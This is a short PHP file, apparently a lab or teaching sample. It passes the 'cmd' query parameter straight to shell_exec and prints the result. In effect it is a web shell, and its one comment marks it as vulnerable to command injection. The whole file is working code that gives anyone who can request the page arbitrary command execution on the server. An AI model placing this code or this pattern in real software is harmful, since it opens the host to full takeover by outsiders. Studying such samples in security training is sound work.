<?php
if (isset($_GET["cmd"])) {
    echo "<pre>";
    echo shell_exec($_GET["cmd"]);  // Vulnerable to command injection
    echo "</pre>";
} else {
    echo "Provide a cmd parameter.";
}
?>
